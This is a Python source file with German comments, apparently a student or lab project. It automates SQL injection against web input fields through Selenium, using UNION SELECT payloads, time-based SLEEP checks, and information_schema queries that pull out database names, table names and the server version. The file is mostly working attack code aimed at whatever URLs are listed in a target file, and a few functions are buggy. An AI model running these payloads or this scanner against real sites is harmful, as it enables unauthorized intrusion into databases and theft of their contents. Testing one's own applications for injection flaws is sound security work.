# Import necessary modules

#Grund Problem bei allem, wie viel darf vorgegeben werden?
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
import time

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait

import threading

#für die Farben
init()
#Konstanten
INJECTION_STRING = "INJECTIONPOSIBLE"
MAX_TABLE_SIZE = 3

#Was wir herausgefunden haben:
injectionPossible = False
nameOfDatabase = ""
nameOfTables = []

#files
websiteFile = "websiteFile.txt"
resultFile  = "resultFile.txt"

"""FÜhrt injections versuche auf einem input feld aus
BRUTFORCE für die anzahl der spalten"""
def runInjection():
    checkString = "1 UNION SELECT ".INJECTION_STRING

"""Scheckt anhand des resultats ob eine INjection erfolgreich war"""
def checkIfInjectionIsSuccessful(pageContent):
    global injectionPossible
    if(pageContent.find(INJECTION_STRING) != -1):
        print(Fore.RED + "Injection möglich !" + Style.RESET_ALL)
        injectionPossible = True
        return True
    else:
        print(Fore.GREEN + "KEINE Injection möglich!" + Style.RESET_ALL)
        return False

""" Wenn injections möglich sind können weitere Daten herausgefunden werden, Version, schema etc"""
def informationGathering():
    #show Tables
    #describe MY_DATABASE.user_info
    #SHOW COLUMNS FROM user_info
    pass

#Hilfs Funktionen
"""Zum aufrufen einer website und inserten 1 Befehles 
 @url gibt die url an die angesteuert wird
 @id die id des input feldes
 @string gibt den String an der abgeschickt werden soll"""
def goToWebsiteAndInsert(url, id, string):
    print("Wir gehen zur website " + str(url) + " versuchen an dem input feld " + str(id) + " den string " + str(string))
    driver = webdriver.Chrome()
    driver.get(url)
    time.sleep(2)
    input_field = driver.find_element(By.ID, id)
    input_field.send_keys(string)
    input_field.send_keys(Keys.RETURN)
    time.sleep(2)
    return driver.page_source

"""Schneidet aus einer HTML antwort alles raus und gibt nur relevantes zurücl """
def clearResult(messyString):
    soup = BeautifulSoup(messyString, 'html.parser')
    text = ' '.join(soup.find_all(text=True))
    text = ' '.join(text.split())
    matching_words = []
    words = text.split()
    # Iterate through the list of words
    for i, word in enumerate(words):
        if word.startswith("START") and word.endswith("ENDE"):
            matching_words.append(word)
    endWords = []
    for word in matching_words:
        endWords.append(word[5:-4])
    return endWords

def findOutTableNamesCaller(websitObject, databaseName):
    result = "NICHT_ERKENBAR"
    try:
        for i in range(MAX_TABLE_SIZE):
            if result == "NICHT_ERKENBAR":
                result = findOutTablesUnionTable(websitObject["url"], i, websitObject["inputfields"][0], databaseName)
        if result == "NICHT_ERKENBAR":
            result = False
    except:
        pass
    return result

"""Versucht herauszufidenn was für Tablen es gibt. Dabei muss es um ein String injection handeln """
def findOutTablesUnionTable(url, extraColumns, id, database="MY_DATABASE"):
    try:
        fillerString = ""
        for i in range(extraColumns):
            fillerString = fillerString + "NULL as col" + str(i) + ","

        injectionString = '" UNION SELECT ' + str(fillerString) + ' CONCAT("START",TABLE_NAME, "ENDE") FROM information_schema.tables WHERE TABLE_SCHEMA = "' + str(database) + '"#'
        pageContent = goToWebsiteAndInsert(url, id,injectionString)
        tableNames = clearResult(pageContent)
        if tableNames:
            return tableNames
    except:
        pass
    return "NICHT_ERKENBAR"
""""""
def findOutNameOFDatabaseCaller(websitObject):
    try:
        result = "NICHT_ERKENBAR"
        for i in range(MAX_TABLE_SIZE):
            if result == "NICHT_ERKENBAR":
                result = findOutNameOfDatabase(websitObject["url"], websitObject["inputfields"][0], i)
        if result == "NICHT_ERKENBAR":
            result = False
        return result
    except:
        return False
"""geht nur wenn es sich um string handelt """
def findOutNameOfDatabase(url, id, extraColumns):
    try:

        global nameOfDatabase
        fillerString = ""
        for i in range(extraColumns):
            fillerString = fillerString + "NULL as col" + str(i) + ","
        injectionString = '" Union SELECT ' + fillerString  + ' CONCAT("START", Database(), "ENDE") #'
        pageContent =goToWebsiteAndInsert(url,id, injectionString)
        database = clearResult(pageContent)
        if database:
            return database
        else:
            return "NICHT_ERKENBAR"
    except:
        return "NICHT_ERKENBAR"
"""Ruft unioonAttackOnTanble auf mit unterschiedlichjer anzahl an colums """
def tableTest(url, id):
    result = False
    for i in range(MAX_TABLE_SIZE):
        if result is False:
            result = unionAttackOnTable(url, i, id)
    return result

"""Wird von table test aufgerufen, testet einen Table mit definierten COllum größe """
def unionAttackOnTable(url, extraColumns, id):
    fillerString = ""
    for i in range(extraColumns):
        fillerString = fillerString + "NULL as col" + str(i) + ","
    injectionString = '" UNION SELECT ' + fillerString + ' "INJECTIONPOSIBLE"# '
    result = goToWebsiteAndInsert(url, id, injectionString)
    result = checkIfInjectionIsSuccessful(result)
    return  result

def sqlTypidentifizierenCaller(websitObject):
    try:
        result = "NICHT_ERKENBAR"
        for i in range(MAX_TABLE_SIZE):
            if result == "NICHT_ERKENBAR":
                result = sqlTypidentifizieren(websitObject["url"], i, websitObject["inputfields"][0])
        if result == "NICHT_ERKENBAR":
            result = False
    except:
        result = False
    return result

"""versucht den typ herauszufinden """
def sqlTypidentifizieren(url, extraColumns, id):
    try:
        fillerString = ""
        for i in range(extraColumns):
            fillerString = fillerString + "NULL as col" + str(i) + ","
        injectionString = '" UNION SELECT ' + fillerString + ' @@version; # '           #nur string ist doof
        pageContent = goToWebsiteAndInsert(url, id, injectionString)
        if (pageContent.find("maria") != -1):
            print("MARIA DB ERKANNT!")
            return "MARIA"
        else:
            print("Ist VERMUTLICH mySQL")
            return "NICHT_ERKENBAR"
    except:
        return "NICHT_ERKENBAR"

def tableLogic(url, id):
    global injectionPossible
    global nameOfDatabase
    global nameOfTables

    for i in range(MAX_TABLE_SIZE):
        unionAttackOnTable(url,i,id)
    if(injectionPossible == True):
        for i in range(MAX_TABLE_SIZE):
            database = findOutNameOfDatabase(url,"searProcuct", i)
            if database:
                nameOfDatabase = database
        if database:
            for i in range(MAX_TABLE_SIZE):
                tables = findOutTablesUnionTable(url, i, nameOfDatabase)
                if tables:
                    nameOfTables = tables

        print("injection war möglich")
        print("Die datenbank heisßt" + nameOfDatabase)
        print("Die tabellen heißen: " + nameOfTables)

def readFileForWebsites():
    targets = []
    with open(websiteFile, 'r') as f:
        for line in f:
            website = {}
            parts = line.split(',')
            website["url"] = parts[0]
            del parts[0]
            for i in range(len(parts)):
                parts[i] = parts[i].replace("\n", "")
            website["inputfields"] = parts
            targets.append(website)
    return targets
def writeResultInFile(result, advanced = None):
    with open(resultFile, "w") as f:
        for line in result:
            string = "Das Inputfiled mit der id : " + str(line["inputfields"][0]) + " Auf der Website : " + str(line["url"]) + " hat"
            if(line["testResult"] is True):
                string += " eine sichereheits Lücke Für SQL injection! \n"
            else:
                string += " Nach den Tests dieses Botes KEINE SQL injections \n"
            f.write(string)
        if advanced is not None:
            print("Es folgt advanced : ")
            print(advanced)
            f.write("datenBankName: " + str(advanced["datenBankName"]) + ", sqlVariante : " + str(advanced["sqlVariante"]) + ", tabellenName: " +str(advanced["tabellenName"] + "\n"))
        f.write("Bitte beachte das dieser Bot nur bestimmte SQL injections abfragt, dass nicht finden bedeutet nicht das die websiten sicher sind")
""" TImmer injection  welche  checckWebsiteTimmer aufruft um über zeit herauszufinden ob incetion möglich war"""
def timmerAttack(url, id):
    delayTime = 8                                       #seconds which are delay from thread
    thread = threading.Thread(target=checckWebsiteTimmer, args=(url,id))
    start_time = time.perf_counter()
    thread.start()
    thread.join()
    elapsed_time = time.perf_counter() - start_time
    if(elapsed_time > 18):
        print("INJECTION möglich!")
        return True
    else:
        return False
"""Wird von timmerAttack in einem Thread aufgerufen um zu überpfüfenn ob eine injection erfolgreich war """
def checckWebsiteTimmer(url,id):
    driver = webdriver.Chrome()
    driver.get(url)
    input_field = driver.find_element(By.ID, id)
    input_field.send_keys("1 AND SLEEP(10)=0;")                 #Aktuell nur mit ints !!!
    #input_field.send_keys("1")
    input_field.send_keys(Keys.RETURN)
    driver.quit()

"""testet ob die website eine Zahl erwartet """
def intCheck(url, id):
    injectionString = "1 UNION SELECT " + ' "INJECTIONPOSIBLE"# '
    result = goToWebsiteAndInsert(url, id, injectionString)
    result = checkIfInjectionIsSuccessful(result)
    return result

"""Funktion welche alle möglichen angriffe ausführen soll üund für jede website ausgefüghrt werden soll """
def websiteChecker(websiteObject):
    result = False
    result = intCheck(websiteObject["url"], websiteObject["inputfields"][0])
    if result is False:
        result = tableTest(websiteObject["url"], websiteObject["inputfields"][0])
    if result is False:
        result = timmerAttack(websiteObject["url"], websiteObject["inputfields"][0])

    if result is True:
        #ergebnis speichern
        websiteObject["testResult"] = result

    print("Erbgenis ist " + str(result))
    return (websiteObject, result)

def __main__():
    datenBankName = "NICHT_ERKENBAR"
    tabellenName  = None
    sqlVariante   = "NICHT_ERKENBAR"

    websiteObjects = readFileForWebsites()
    print(websiteObjects)

    injectionPosiblle = False
    for i, websiteObject in enumerate(websiteObjects):
        result = websiteChecker(websiteObject)
        websiteObjects[i] = result[0]
        if injectionPosiblle is False:
            injectionPosiblle = result[1]
    """
    """
    #wenn injectionPosible war in einer website rest herausfinden:
    if injectionPossible is True:
        for websiteObject in websiteObjects:
            if datenBankName == "NICHT_ERKENBAR":
                print("es wird versucht DB name zu erkennen")
                datenBankName = findOutNameOFDatabaseCaller(websiteObject)
            if sqlVariante == "NICHT_ERKENBAR":
                print("es wird versucht variante zu erkennen")
                sqlVariante = sqlTypidentifizierenCaller(websiteObject)

            if tabellenName is None and datenBankName != "NICHT_ERKENBAR":
                print("es wird versucht tabellen namen zu erkennen")
                tabellenName  =  findOutTableNamesCaller(websiteObject, datenBankName)

    else:
        pass
    advance = None
    if sqlVariante != "NICHT_ERKENBAR" or datenBankName is not None or tabellenName is not None:
        advance = {}
        print("advance gesetzt !")
        advance["datenBankName"] = datenBankName
        advance["tabellenName"]  = tabellenName
        advance["sqlVariante"]   = sqlVariante
    writeResultInFile(websiteObjects, advance)


__main__()

#sqlTypidentifizieren("http://localhost:8000/Views/webshopView.php", 2, "searchProduct")
#tableLogic("http://localhost:8000/indexWebshop.php", "searchProduct")
#timmerAttack("http://localhost:8000/Views/timerIndex.php", "id")


